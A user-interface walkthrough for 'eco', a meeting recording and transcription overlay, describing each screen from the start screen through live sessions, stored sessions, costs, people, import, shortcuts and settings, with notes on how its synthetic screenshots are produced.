# The window, in the order somebody meets it

A walk through eco's window, from opening it with nothing recorded yet to
looking back at a session weeks later. **Every screen the overlay draws is
here**, including the dialogs a happy path never reaches, so that a change to
the window has somewhere to be checked against. They are in the order of use,
not sorted by QML file.

[cli.md](cli.md) is where the *commands* are; this page is where the *window*
is. Why each screen is the way it is lives in [design.md §12](design.md#12-the-overlay).
If you are looking for a task rather than a screen, start at
[the map](README.md).

---

## How this page stays true

| what | how |
|---|---|
| the pictures under `img/`, `01`–`56` | `mise run shots`: writes them from the real overlay, offscreen |
| checking they are still what the window draws | nothing does: there is no `shots:check` (see below) |
| `img/eco.gif`, the icon | not a screen: drawn by `mise run readme:gif` from `packaging/eco.omapixel` |
| the window on a real desktop, over a real call | no pictures: none were taken for this page |

`mise run shots` needs no display and no call. It builds the checkout's daemon,
starts it with `--headless --replay` in a home of its own at `/tmp/eco-shots`
(runtime, data, config, state and cache directories), copies `overlay/` there
with a test-only driver, `scripts/shots/Drive.qml`, and runs that copy with the
checkout's `eco-window` under `QT_QPA_PLATFORM=offscreen`. The driver takes
JavaScript over a socket of its own, clicks and types as somebody would and
saves each window as it is drawn. A frame is refused if the window has lost the
daemon (except `02`, which is that), if it shows an error, or if it is flat —
eight colours or fewer, which is a window that drew nothing. The user's
daemon, socket and sessions are never touched: the script refuses to run if its
socket would be the user's.

What is pinned: the clock's zone is UTC and the locale `en_US`; the interface
language is English (`[ui] language = "en-US"`); the theme falls back to the
overlay's own defaults (`#39ff14` accent on `#121212`), because the temporary
state directory holds no Omarchy theme; the API keys are placeholders that are
never sent; and the home is always `/tmp/eco-shots`, so the storage path in the
session details reads the same in every run.

What is not pinned, and why there is no `shots:check`: **the live session runs
on the clock of the run.** Its running time in the capsule, the times on its
lines, its answer and its note, and `Today 23:39` in the sessions list are when
`mise run shots` was last run, in UTC. The input traces are a synthetic hum
replayed in real time, so where a burst falls in a frame depends on when the
frame was taken; and the software renderer places text at sub-pixel positions
that differ between runs. Two runs never write the same bytes, so a check that
compared them would always fail. Which face `monospace` resolves to is
fontconfig's answer on the machine that ran it.

### The sessions in the pictures

Everything below is synthetic, from `scripts/shots/fixtures/`. No real person,
résumé, recording or key is in it.

**The config** (`fixtures/config.toml`) has five kinds — `meeting`,
`conversation`, `other`, `idea` and a custom `interview` — and four models:
`whisper-lan` (transcription, at a documentation address, `192.0.2.10`, that is
never reached), `deepgram` (transcription, used by `interview`, with a price per
minute), `gemini-flash` (chat, the assistant and the translator) and
`claude-haiku` (chat, used by the `minutes` skill). Two audio sources: **Me**,
the user, on the default microphone, and **Them** on the default output. Three
skills: `reply`, which has a hook (`~/bin/post-to-notes`, never run),
`minutes` and `explain`. One global context file,
`~/notes/about-me.md`, and one context slot, `resume`, that `interview`
sessions start with on.

**Seven stored sessions**, all ended, written straight into the sessions
directory as logs:

| session | kind | when (UTC) | what it is there for |
|---|---|---|---|
| Weekly sync | meeting | 24 Feb 2025 10:00 | `M. Lee`, the half of a duplicate person to merge; tags `#Acme #Weekly` |
| Rust meetup: async in practice | other | 27 Feb 2025 18:00 | imported; one speaker whose voice is close to Jonas Weber's — the voice guess |
| Offline mode for the field app | idea | 3 Mar 2025 19:40 | only the user speaks; `#Product` |
| Coffee with Jonas | conversation | 4 Mar 2025 11:15 | Jonas Weber's voice, which the guess above matches |
| Northwind backend interview | interview | 5 Mar 2025 09:00 | the custom kind, on `deepgram`, with the `resume` slot on; `#Hiring`; an answer whose cost was not reported, and minutes Deepgram would not price |
| Revisión de precios | meeting | 7 Mar 2025 16:30 | spoken in Spanish, translated into English |
| Acme onboarding kickoff | meeting | 10 Mar 2025 14:00 | the session most pictures open: ten lines, two answers, a note, an unnamed `Speaker 3`, a person added with no voice, and its costs |

**Seven people**: Ana Ribeiro (two voices, two sessions), Marcus Lee and
M. Lee (the same man twice), Chen Wei, Jonas Weber, Sofia Alvarez, and Priya
Shah, who is in the kickoff without a voice of her own.

**The live session** is started by the pictures themselves, in the new-session
dialog: `Sprint planning`, a meeting tagged `#Acme`. The daemon hears only
`replay.wav`, ten minutes of synthetic hum in bursts written by the script,
which goes to the first source that is not the user (**Them**). It holds no
speech, so nothing is transcribed and no model is asked anything. The lines,
the answer and the note on screen in `05` to `10` come from
`fixtures/live.json`, and the later answers in `07` and `08` — sent, not sent,
failed, thinking — from `fixtures/answers.json`. Both are handed to the window
directly; the daemon never heard them, and `eco show` on that session would not
list them.

**Also handed to the window, not done by the daemon:** the empty input list of
`04`, the import part way through in `36` (the replay has no speech for an
import to transcribe), the three PipeWire devices in the menu of `40`
(`fixtures/devices.json`: under `--replay` the daemon lists none), and the held
change of `56`. The import
dialog in `35` names `~/recordings/sprint-retro.vtt` from the fixtures and is
closed without importing it. `02` is the last picture taken: the script stops
the daemon first.

---

# 1. Opening it

```bash
eco start
```

`eco start` starts the daemon's user service if nothing answers on the socket
and opens a window (`--headless` leaves it closed). Opening the app again brings
the open window forward, or opens another on a live session no window shows;
each window is its own `eco-window` process.

![The start screen: the masthead "ECO / READY" with the settings button on the right; a wide input trace swinging in two bursts with a flat stretch between them; four stacked buttons, NEW SESSION lit as the primary one, then SESSIONS, IMPORT and PEOPLE; under them "Outside a session the signal is only measured: nothing is transcribed or recorded."](img/01-start.png)

The trace is every input in the room, in each input's colour. Flat is silence,
a swing is audio, and a faint dashed line is an input that sends nothing — so a
glance says capture works before a session starts. The sentence under the
buttons is literal: outside a session the audio is measured for this trace and
nothing else.

**No connection badge while things work.** Without the daemon the start
screen's masthead reads `OFFLINE`, its buttons dim, and the line under them
says `Daemon disconnected · eco start`; every other screen shows a
`DISCONNECTED` badge in its masthead. The window reconnects on its own.

![The start screen without the daemon: the masthead "ECO / OFFLINE"; the last input trace it drew, standing still; NEW SESSION, SESSIONS, IMPORT and PEOPLE dimmed; and under them, in amber, "Daemon disconnected · eco start".](img/02-disconnected.png)

| key | what it does |
|---|---|
| `N` | new session |
| `H` | SESSIONS |
| `I` | import a recording |
| `P` | people |
| `?` · `F1` | every key, in one list (section 11) |

No button shows its key; keys live only in the shortcuts list.

# 2. Starting a session

**NEW SESSION**, or `N`:

![The new session dialog over the dimmed start screen: TITLE "Sprint planning"; KIND "Meeting" and LANGUAGE "EN · American English" dropdowns; "Transcribes with whisper-lan · answers with gemini-flash"; TAGS with an "#Acme ×" chip above an "Add a tag" field and ADD; CONTEXT with an unlit "resume" chip; WHO WILL BE HEARD "Them · replay.wav"; CANCEL and START.](img/03-new-session.png)

Everything is optional except the kind and the language. The title's
placeholder is the title the session gets if none is typed (the kind and the
time). The dialog starts from the kind and language this window's last session
used, and says which models that kind runs on, so a paid transcriber is never
picked unseen. Tags offer the existing ones as they are typed. The context
slots are chips: those of the chosen kind start lit — `resume` is off here
because it belongs to `interview`. WHO WILL BE HEARD lists the sources and their
inputs; in the picture it is only the replayed file. Where no chat model
answers the kind, the models line says only `Transcribes with whisper-lan` and no
context slots are offered.

**Without an input** the dialog cannot start: it says `No input configured:
nothing would be heard.` and offers AUDIO SETTINGS.

![The new session dialog with no input: the title field showing its placeholder, "Meeting" and the time of the run; KIND, LANGUAGE and the models line as before; an empty TAGS field; CONTEXT "resume"; under WHO WILL BE HEARD, in amber, "No input configured: nothing would be heard." and an AUDIO SETTINGS button; START dimmed.](img/04-new-session-no-input.png)

`Enter` in a field starts, `Esc` cancels, `Tab` walks the fields.

# 3. During a session

**START** puts the window on the session. This is the window for as long as it
lasts:

![The live session at 720×720: the masthead "ECO / SPRINT PLANNING" with the language dropdown "EN · American English", the details, settings and close buttons; a red capsule reading "00:01:15 RECORDING" with a small trace, PAUSE and END; a framed REPLY answer from google/gemini-2.5-flash, with send, translate, copy and remove buttons on its heading, "Answer: Priya approves it; I send her the form today. Why: she is Acme's IT contact for the export server, so nothing moves until she signs."; a NOTE card "Ask Priya for the VPN account before Friday."; then YOU lines in faint boxes on the right and THEM lines in tinted boxes on the left; the skill chips "1 REPLY", "2 MINUTES", "3 EXPLAIN"; and the composer "Ask about the session, or /skill" with NOTE and SEND.](img/05-live.png)

From the top:

- **The masthead** carries the session's title (a session without one is named
  by its kind), the language it is transcribed in — switchable mid-session —,
  the details button `⋯` (section 6), settings, and close. **Close goes back to
  SESSIONS; a live session keeps recording.**
- **The capsule** is one line: the running time (stopped while paused), the
  state with a dot that keeps sending out a ring while it records, the trace of
  every input, PAUSE and END. Clicking the state pauses or resumes. END fills
  red and asks `END?` once more before it ends the session (pictured below).
  A warning appears in the capsule only for an input that sends no audio
  while recording — its name on hover, the Audio settings on click; the
  replay always sends, so it is not in the pictures.
- **The conversation** takes every pixel left. Others' speech is in a box tinted
  with their colour, on the left; the user's in a faint box on the right. A
  speaker's name and time head each turn. Answers are framed cards, drawn as
  their Markdown streams, with the skill or question that asked for them, and
  translate, copy (`wl-copy`, as Markdown) and remove (×). A note is a card of
  its own. Hovering a line shows ✎ to correct it and × to remove it; clicking a
  speaker's name asks who they are (section 7).
- **The composer**: the skills as numbered chips, and a line to ask anything.
  Typing `/` lists the skills above the line as the word grows. NOTE (or
  `Shift+Enter`) keeps the text as a note instead of asking it. Where no chat
  model answers the session's kind, the line reads `Write a note`, there is no
  SEND, `Enter` keeps a note, and only the skills that name a model of their own
  show.

![The same session with "/" typed in the composer: a small list above it, "/reply" marked, "/minutes" and "/explain", over the last line and the skill chips.](img/06-live-skills.png)

An answer waiting for its first word draws a loading trace and counts seconds,
`WAITING FOR THE MODEL · n S`, or `THINKING · n S` with the model's reasoning
under it while it reasons; the count goes with the first word, as the trace
reaches its end. A failed one stays, in red, saying why, until it is
removed. A skill with a hook has a send button on its card, and the card says
how sending went: SENDING…, SENT or NOT SENT.

![Three later answers at the end of the live session: a REPLY card marked NOT SENT in red beside its send button; an ASK card in a red frame, "How big is the first export?", with "No answer: HTTP 429: rate limited"; and a MINUTES card from anthropic/claude-haiku-4.5 in a green frame, "THINKING · 21 S" with its reasoning in italics, the MINUTES chip lit below it.](img/07-live-answers.png)

The window follows the newest entry. Scrolled up, a `↓ N new` pill above the
composer counts what arrived below; a click or `End` goes back down.

![The live session scrolled up to its first answer, a REPLY card marked SENT in green; at the bottom of the conversation, above the skill chips, a pill "↓ 4 NEW".](img/08-live-new.png)

Paused, the capsule turns amber and reads PAUSED, its time stopped, and PAUSE
becomes RESUME. END asks first:

![The capsule paused: an amber dot, "00:01:25", PAUSED, the trace, RESUME, and END filled red reading "END?".](img/09-live-end.png)

`END?` goes back to END after three seconds without a second click.

On a short window — the picture is 420×480 — the capsule joins the masthead
and the skill chips go (`Alt+1…9` still run them):

![The live session at 420×480: the masthead "SPRINT …" with the capsule inside it — a red dot, "00:01:17", pause and end as icons — and the details, settings and close buttons; the last four lines of the conversation; and the composer "Ask, or /skill" with the note and send buttons as icons.](img/10-live-short.png)

Under 560 px wide the capsule keeps icons only and the language picker moves
into the details; under 560 px tall the margins tighten and the skill chips
hide. The window goes down to 240×320.

**When a source's transcription is down**, a line under the capsule says so
for that source, in amber: `Transcription down · reconnecting`, with the
provider's reason on hover. eco keeps opening the connection and holds what is
heard meanwhile (design §5). When a connection takes the audio again the line
turns green, `Transcription back`, with `· N s of audio lost` when an outage
outlasted the five minutes eco holds; it goes with the source's next line, or
ten seconds later. A device that cannot be opened, or stops, reads
`Device not heard · opening it again` on the same line, with why on hover,
while the other sources go on; eco opens it again until it is heard. An error
of the capture or its transcription on the status line — a capture that
stopped, a line that could not be transcribed — goes when the last recording
session ends or you leave the session, so the sessions list never shows it.
Nothing here is a key or a button. The picture is the live
session fed one source down and the other back, from
`scripts/shots/fixtures/outage.json`: the replay transcribes nothing, so no
provider went down to take it.

![The live session with two lines under the capsule: a grey square, THEM, an amber warning sign and "Transcription down · reconnecting"; a white square, ME, a green check and "Transcription back · 18 s of audio lost"; below them the conversation ends on "Thursday at ten works. I'll book the room."](img/11-live-transcription.png)

| where | key | what it does |
|---|---|---|
| conversation | `↑` `↓` `PgUp` `PgDn` | move through lines, notes and answers |
| conversation | `Home` · `End` | the first or the last |
| conversation | `N` | name the speaker of the line |
| conversation | `Tab` | reach the line's tools |
| composer | `Enter` | send the question |
| composer | `Shift+Enter` | keep the text as a note |
| composer | `/` | list the skills: `↑` `↓` choose, `Tab` completes, `Enter` runs |
| composer | `Alt+1…9` | run the skill with that number |
| session | `E` | edit title and kind |
| anywhere | `Esc` | close what is open: a menu, a dialog, the details, then the session |

# 4. Finding it again

**SESSIONS**, or `H` on the start screen, or closing a session:

![The sessions list: the masthead "ECO / SESSIONS", HOME, IMPORT and PEOPLE buttons and "8 SESSIONS"; the search field "Search what was said, noted or answered… /"; a line of chips "LIVE 1", "ALL" lit, MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW, a divider, "#Acme" and more tags cut at the edge; under LIVE, "Sprint planning · Meeting · Today 23:39 · 0 min · #Acme" with a green RECORDING dot; then day headings 10 MAR 2025, 07 MAR 2025, 05 MAR 2025, 04 MAR 2025, each row with its title, kind, date, length, tags, people, ENDED and a trash button.](img/12-sessions.png)

The live sessions come first, under LIVE, toned and with a dot before their
state; the others newest first under their day. Each row is title, kind,
start, length, tags, people and state. **No cost**, here or anywhere outside a
session's own details. A live row has no delete; an ended one has a trash can
that asks first.

The chips are one line that scrolls sideways: LIVE, the kinds (only when there
is more than one), and the tags. A tag's chip, right-clicked (or the menu key),
renames or deletes it in every session:

![The sessions list filtered by "#Acme", the chip lit, "4 SESSIONS", with a small menu open under the chip offering RENAME and, in red, DELETE.](img/13-sessions-tag.png)

Renaming into a tag that exists says the two become one (that dialog is not
pictured); deleting asks first, saying how many sessions lose it:

![The sessions list dimmed under a DELETE TAG dialog in a red frame: "Delete #Acme? 4 sessions lose it." with CANCEL and, in red, DELETE.](img/14-sessions-tag-delete.png)

LIVE narrows the list to what is recording now, and says what is transcribing
it — the model, the language, and `×n` when one transcriber feeds several
sessions — so a second paid model never runs unseen:

![The sessions list with "LIVE 1" lit: "1 SESSION", a line "TRANSCRIBING whisper-lan · EN", and the one live row, Sprint planning, RECORDING.](img/15-sessions-live.png)

**This is the only place a live session shows.** Not on the start screen, and
not in another session's conversation. Opening its row puts it in this window.

The search field searches what was said, noted or answered in every session
(`/` from anywhere in the list):

![The sessions list searched for "VPN": "1 SESSION", and the one row, Acme onboarding kickoff, ENDED.](img/16-sessions-search.png)

A search with nothing behind it says why, and offers the way back:

![The sessions list searched for "quarterly budget": "0 SESSIONS", "No session matches “quarterly budget”." and a CLEAR FILTERS button.](img/17-sessions-empty.png)

There is a different sentence for each empty list: `No session recorded yet.`
on a new machine, `No live session.` under LIVE, `No session matches these
filters.` for chips with no search. Until the first list arrives the table says
`Loading sessions…`. Only the search's is pictured. In a narrow window the
table stacks its fields; a person's chip, `PERSON: Ana Ribeiro ×`, appears when the list is
opened from People (section 9).

| key | what it does |
|---|---|
| `↑` · `↓` | choose a row (`↑` on the first goes back to the search) |
| `Enter` | open it |
| `Delete` | delete it, asking first |
| `I` | import a recording |
| `/` | search |
| `F2` · `Delete` · menu key | on a tag chip: rename, delete, or open its menu |
| `Esc` | back |

`P` opens People only on the start screen; here PEOPLE is the button.

# 5. A stored session

Opening a row puts the session on screen: **the same view as a live one**, with
one line where the capsule was:

![The stored session "ACME ONBOARDING KICKOFF": a line "MEETING · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES" with REOPEN on the right; then the conversation — SPEAKER 3 in a greenish box, ANA RIBEIRO in a grey one, MARCUS LEE in a yellowish one — an ASK card with the question "What did we agree on the deadline?" in italics and its answer with "first export" and "21st" in bold, a last SPEAKER 3 line; the skill chips and the composer.](img/18-session.png)

That line says when it was, how long, and how much was said, and offers the way
back into it: REOPEN for an ended session, RESUME for a paused or interrupted
one (`R`). Either turns the line into the capsule. The composer works here too:
a question asked afterwards is answered from the stored transcript.

Each person keeps their colour across sessions; a speaker nobody has named
(`Speaker 3`) still gets one of their own.

![The same session at 420×480: the line elided to "MEETING · 10 MAR 2025 14:00 · 00:34:5…" with a play icon, the last Marcus Lee line, the ASK card, the last Speaker 3 line, and the composer with icon buttons.](img/19-session-short.png)

# 6. What a session is: the details

`⋯` in the masthead opens the details over the top of the conversation:

![The details panel of Acme onboarding kickoff: "ENDED · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES · 2 ANSWERS · 1 NOTE" with the edit button; the path "/tmp/eco-shots/.local/share/eco/sessions/2025-03-10-140000-acme-onboarding-kickoff.jsonl" and COPY PATH; PEOPLE "Ana Ribeiro, Marcus Lee, Priya Shah" with a + button; SPEAKERS — Speaker 1 → Ana Ribeiro (CLEAR, CHANGE), Me (you) → No one yet (CHANGE), Speaker 2 → Marcus Lee (CLEAR, CHANGE), Speaker 3 → No one yet (CHANGE); TAGS "#Acme ×" "#Q2 ×" and "Add a tag"; CONTEXT with an unlit "resume" chip; "TRANSLATION: OFF"; and COST, COPY VTT and, in red, DELETE.](img/20-session-details.png)

Top to bottom: what the session is on one line, with the edit button (title and
kind; `E`); where its log is, for a stored session; the people in it; who each
speaker is; its tags; which context slots it sends; whether it translates; and
COST, COPY VTT (the transcript as WebVTT, to the clipboard) and DELETE. A live
session's DELETE is off.

**The edit button** opens `edit session`, the title and the kind:

![The EDIT SESSION dialog over the dimmed details: TITLE "Acme onboarding kickoff", KIND "Meeting", CANCEL and SAVE.](img/21-session-edit.png)

**PEOPLE `+`** opens the people dialog: those who are in the session because a
speaker is them (FROM SPEAKERS, and off, with the reason on hover), and under
ADD SOMEONE those added by hand — Priya Shah here — and everyone else known:

![The PEOPLE IN THIS SESSION dialog: FROM SPEAKERS with Ana Ribeiro and Marcus Lee as dimmed chips; ADD SOMEONE with a field "Add a person by name" and ADD, then chips for Priya Shah (lit, with ×), Chen Wei, Jonas Weber, M. Lee and Sofia Alvarez; CLOSE.](img/22-session-people.png)

**DELETE** asks `Delete <title>?` and says the transcript, answers and voice
links go for good:

![The DELETE SESSION dialog in a red frame: "Delete Acme onboarding kickoff?" and, in red, "The transcript, answers and voice links will be permanently removed.", with CANCEL and, filled red, DELETE.](img/23-session-delete.png)

**When eco recognises a voice**, the session says so on one line, and REVIEW
opens the details at the speakers:

![The imported session "RUST MEETUP: ASYNC IN PRACTICE": the line "OTHER · 27 FEB 2025 18:00 · 00:52:00 · 3 LINES · IMPORTED"; a line "1 VOICE GUESS" with REVIEW; the details open, SPEAKERS saying "eco guessed these speakers from their voices. Nothing changes until you confirm.", Speaker 1 → No one yet, and Speaker 2 → "Jonas Weber? · 93%" with CONFIRM lit, CLEAR and CHANGE.](img/24-session-guess.png)

The guess is never applied on its own: the speaker's lines read `JONAS WEBER?`
until CONFIRM, and CLEAR drops it. On a short window the count moves onto the
details button.

**TRANSLATION** picks a language for this session only — any of the seventeen eco
knows but the session's own:

![The details of Acme onboarding kickoff with the TRANSLATION menu open over them: OFF marked, then PT · português, ES · español de España, FR · français, DE · Deutsch, IT · italiano, NL · Nederlands, PL · polski, RU · русский, UK · українська, TR · Türkçe, cut at the window's edge.](img/25-session-translation.png)

From then on every line and answer carries its translation under it:

![The stored session "REVISIÓN DE PRECIOS": Sofia Alvarez's and the user's lines in Spanish, each with its English translation in italics under it, and an ASK card "¿Qué falta decidir?" answered in Spanish with the English under it.](img/26-session-translated.png)

The model that translates is chosen in Settings › Translation; whether a
session translates is chosen only here. Where no model translates the session's
kind, there is no TRANSLATION line (unless the session still translates, to turn
it off) and no translate button on its answers; CONTEXT goes too when nothing
answers in that kind.

# 7. Who is who

The SPEAKERS list of the details is the one place in the window that says who
each speaker is. CHANGE on a speaker, or clicking a speaker's name in the
conversation (`N` on a line), asks:

![The "assign person" dialog over the details: APPLY TO with THIS SPEAKER lit and, in orange, "2 lines will change"; WHO THIS IS with "Tom Becker" typed; a SPEAKER COLOR swatch; KNOWN PEOPLE chips — Ana Ribeiro, Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah, Sofia Alvarez; CANCEL and SAVE.](img/27-session-speaker.png)

It offers the people the voice suggests first, with their score when the
session kept one, then everyone known, then a new name. It says how many lines
will change, as a warning when it is more than one. Opened from a line, APPLY
TO also offers THIS LINE, for a line the diarizer gave to the wrong speaker.
The colour changes a known person's colour everywhere, or keeps a colour for
this speaker in this session's log. Renaming a person to a name somebody else
has warns and offers to merge the two. **A person id is never on screen.**

# 8. What it cost

**COST** in the details, and only there:

![The cost screen: masthead "ECO / COST · ACME ONBOARDING KICKOFF", a SESSION back button and "TOTAL US$ 0.27"; "LLM US$ 0.00068 answers US$ 0.00068" and "TRANSCRIPTION US$ 0.27 (35 MIN)"; then three rows: "Transcription · 35 min, 14:34 · deepgram, US$ 0.27"; "Answer · What did we agree on the deadline?, 14:02 · google/gemini-2.5-flash, US$ 0.00027"; "Answer · reply, 14:00 · google/gemini-2.5-flash, US$ 0.00041".](img/28-session-cost.png)

The total, the LLM part split into answers, reviews and translations, and the
transcription with its minutes; then every charge, what it was for, when, which
model and how much. A charge the provider has not reported yet, or never will,
shows as `?` and a few words, with its reason said once in full above; a total
that leaves one out reads `≥`; and a figure estimated from a price per minute is
marked `≈`:

![The cost screen of "Northwind backend interview": "TOTAL ≥ US$ 0.35"; "LLM US$ ? answers US$ ?" and "TRANSCRIPTION US$ 0.35 (45 MIN)"; in amber, "A provider reported no cost for some calls."; "≈ estimated at the price per minute you set for the model."; then "Transcription · 45 min, 09:45 · deepgram, ≈ US$ 0.35" and "Answer · reply, 09:00 · google/gemini-2.5-flash, ? not reported" in amber.](img/29-session-cost-unknown.png)

On a live session the screen follows the spending while open. SESSION or `Esc`
goes back.

**Cost is shown only when asked for inside a session.** The sessions list, the
answer cards and the masthead never carry it.

# 9. People

**PEOPLE**, or `P` on the start screen:

![The people screen: masthead "ECO / PEOPLE", a SESSIONS back button, "7 PEOPLE" and ADD; seven rows, each a name in the person's colour with "n voices · n sessions" — Ana Ribeiro (selected, outlined), Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah with 0 voices, Sofia Alvarez — and on the right of each a colour swatch, rename, merge and forget buttons.](img/30-people.png)

Everyone eco knows, with how many voices it keeps for them and how many sessions
they are in. Opening a person goes to SESSIONS filtered to them, with the
person's chip first among the filters; its × drops it:

![The sessions list filtered to a person: a lit chip "PERSON: Ana Ribeiro ×" before LIVE 1, ALL and the kinds; "2 SESSIONS"; Acme onboarding kickoff and Weekly sync.](img/31-people-sessions.png)

Each row
changes the person's colour, renames them in every session, merges them, or
forgets them. The back button names where it goes: this one was opened from
SESSIONS.

**Merging** is two steps. MERGE on M. Lee asks who else he is, with CANCEL —
the one way out besides `Esc` while it waits; picking the same person says so.
Picking Marcus Lee asks which name stays:

![The people screen dimmed, a NOTICE "Who else is M. Lee? Pick that person to merge them." with CANCEL at the top, and over it the "merge people" dialog in a red frame: "Merge M. Lee into Marcus Lee? M. Lee's voices and sessions move to Marcus Lee; the name Marcus Lee stays." with SWAP on the left and CANCEL and MERGE on the right.](img/32-people-merge.png)

SWAP turns the direction around. **FORGET** asks too, saying which voices are
deleted — eco will not recognise them again — and that the sessions keep the
name:

![The FORGET PERSON dialog in a red frame over the dimmed people screen: "Forget Ana Ribeiro?" and, in red, "The 2 voices kept for Ana Ribeiro are deleted: eco will not recognise them again. The 2 sessions keep the name Ana Ribeiro.", with CANCEL and, filled red, FORGET.](img/33-people-forget.png)

**ADD** adds somebody by a name nobody has:

![The "add person" dialog over the dimmed people screen: NAME "Tom Becker", CANCEL and ADD.](img/34-people-add.png)

A name somebody already has is refused in the dialog. With nobody known, the
list says `No one yet. Name a live speaker or add someone to a session.` and
offers ADD. Below 420 px wide a row's four buttons fold into one `⋯` menu.

| key | what it does |
|---|---|
| `↑` · `↓` | choose |
| `Enter` | open their sessions |
| `Delete` | forget, asking first |
| `F2` | rename |
| `M` | merge with someone else |
| `Esc` | back |

# 10. Importing a recording

**IMPORT**, or `I` on the start screen or in SESSIONS, or dropping a file on the
window:

![The "import a recording" dialog over the dimmed sessions list: FILE "/tmp/eco-shots/recordings/sprint-retro.vtt" with BROWSE; TITLE "Sprint retro"; KIND "Meeting", LANGUAGE "EN · American English" and SPOKEN BY "Me" dropdowns; CANCEL and IMPORT.](img/35-import.png)

Any file `ffmpeg` decodes is transcribed into a new session; a WebVTT
transcript, like this one, becomes a session as it is, with no transcription.
BROWSE opens the file dialog; importing with no file says one is needed. SPOKEN
BY is the audio source the lines start as; a transcript that names its
speakers keeps them. While it runs, a strip on the start screen and in
SESSIONS shows the progress, and its × stops it; what was transcribed stays.
A streaming transcription that goes down meanwhile is said under the strip,
as in a live session (section 3):

![The sessions list with a strip above the filters: IMPORTING, "Sprint retro", a fill across 62% of the strip, "62%" and a × button.](img/36-import-progress.png)

# 11. Finding your way around

`?` or `F1` lists every key, by where it works:

![The keyboard shortcuts dialog over the sessions list: EVERYWHERE (Tab · Shift+Tab, Enter · Space, Esc, ? · F1), GLOBAL (SUPER+ALT+N new session, SUPER+ALT+H sessions, SUPER+ALT+C settings, SUPER+ALT+P pause or resume, SUPER+ALT+E bring eco to the front, SUPER+ALT+A · Q run the skills bound to these keys), START SCREEN (N, H, I, P), SESSIONS AND PEOPLE (↑ · ↓, Enter, Delete, I, /) and the top of TAG CHIP IN SESSIONS (F2 rename the tag in every session), cut at the bottom edge.](img/37-shortcuts.png)

The dialog scrolls (arrows, `PgUp`, `PgDn`). Its end:

![The keyboard shortcuts dialog scrolled to its end: STORED SESSION (R resume or reopen, E edit title and kind), CONVERSATION (↑ · ↓ · PgUp · PgDn, Home · End, N, Tab, Enter · Esc save or cancel the correction of a line), QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (Ctrl+1…8 switch tab, Ctrl+Tab · Ctrl+Shift+Tab over two lines, next · previous tab, ↑ · ↓ · Home · End and Enter · Space on the rail, ↑ · ↓ pick a row, Enter open the item picked, Delete delete the item picked, Enter and Delete in a table inside an item, Ctrl+E edit the item open, Ctrl+S save, Esc back one level, then close).](img/38-shortcuts-end.png)

The GLOBAL keys are not the window's: `packaging/hypr/eco.lua` binds them in
Hyprland to `eco window` commands, and on Windows the daemon registers them
itself, with `Win` for SUPER, from `[shortcuts]` in the config; those that
open a view ask the daemon to hand them to the newest window and give it the
keyboard (`window.call`), so they work with eco in the background. The dialog
lists the default keys, not keys changed in either place.

Everything the pointer does, the keyboard does: `Tab` reaches every control,
with a focus ring apart from its hover, and a control's hint shows on focus as
on hover.

# 12. Settings

The settings button in any masthead, `SUPER+ALT+C`, opens the config window: a
second window, `eco · settings` to Hyprland, 1040×760 or its screen less a
96-pixel margin when that is smaller, centred on the screen (the pictures are
1040×760). The window never writes the config itself: **each item is saved on
its own**, and the daemon validates the whole config and writes it.

Down the left are the eight sections, `01` to `08`, always in that order, the
one on screen marked in the accent. Each shows its number and its name; on a
window narrower than 760 pixels, only its number, with the name in its hint.
`Tab` moves from the rail to the bar of commands and then into the section;
on the rail, `↑`, `↓`, `Home` and `End` move along it and `Enter` or `Space`
opens the section. The bar holds BACK first, then the main action, solid, on
the left, and the other actions on the right, DELETE, REMOVE or DISCARD last. `×` in
the top-right corner closes the window; the last message shows beside it while
there is one.

A section is **a table of its items**. A click picks a row; a double click, or
`Enter` on the picked row, opens it. The bar holds ADD (the section's own name
for it, such as ADD MODEL), VIEW and DELETE for the picked row, and what else
the section does. DELETE asks first, saying what changes with it, and saves at
once; it is dimmed on an item something still needs, with the reason as its
hint.

An opened item is **read first**: under ABOUT, what it is; under RELATED, the
items of other sections that use it or that it uses, each a link that opens
that item in its section; with nothing related there is no RELATED. Long texts,
such as a skill's prompt, follow across the screen as they were written. BACK returns to the table, or to the item the link
was followed from. **EDIT** turns the screen into its form. SAVE saves this
item alone; DISCARD drops its changes and reads it again; CANCEL stops editing.
The kicker over the title says NEW, UNSAVED, EDITING, or CHANGED ELSEWHERE when
the saved config changed under changes that cannot be made again on it.
Transcription, Translation and Interface are one item each: they open on that
item, with no table of items, no BACK and no DELETE.

Some items hold a list of their own: the spoken languages Transcription
offers, the devices an audio source is heard through, the files a context
sends. Such a list is **a table inside the item**, under a caption, on its read
screen; it is never edited in the form. A click or `↑`/`↓` picks a row, and the
bar then adds what can be done to it: MAKE DEFAULT, MOVE UP and MOVE DOWN where
the order counts, the row's own screen where it has one, and REMOVE. Each of
these **saves at once**; REMOVE asks first only when something follows from it.
ADD (ADD LANGUAGE, ADD DEVICE, ADD FILE) opens **a screen inside the item**:
the item's name small above its title, and either a table of what can be added,
where ADD or `Enter` adds the row picked, or a short form. BACK, or `Esc`,
returns to the item and adds nothing.

| where | key | what it does |
|---|---|---|
| anywhere | `Ctrl+1` … `Ctrl+8` | show that section |
| anywhere | `Ctrl+Tab`, `Ctrl+Shift+Tab` | the next, the previous section |
| the rail | `↑` `↓` `Home` `End` | move along the sections |
| the rail | `Enter`, `Space` | open the section the rail is on |
| a table | `↑` `↓` | pick a row |
| a table | `Enter` | open the picked row |
| a table | `Delete` | delete the picked row, after asking |
| a table inside an item | `Enter` | open the picked row; on an add screen, add it |
| a table inside an item | `Delete` | remove the picked row |
| an item | `Ctrl+E` | edit it |
| an item, editing | `Ctrl+S` | save it |
| anywhere | `Esc` | back one level: a screen inside the item, editing (asking when changes would be dropped), the item, the table, then close the window |
| anywhere | `?`, `F1` | the keyboard shortcuts dialog |

**Audio** — who is heard, and through what:

![Settings, 01 AUDIO: the bar with ADD AUDIO SOURCE, VIEW, REFRESH DEVICES and DELETE; "An audio source is a name in the conversation, heard through its devices; a device has one owner. One audio source may be you."; a table NAME · DEVICES · YOU with Me "Default microphone" YOU (picked), Them "Default output", and YOUR MICROPHONE "DROP ECHOES on · ECHO CANCELLATION off".](img/39-settings-audio.png)

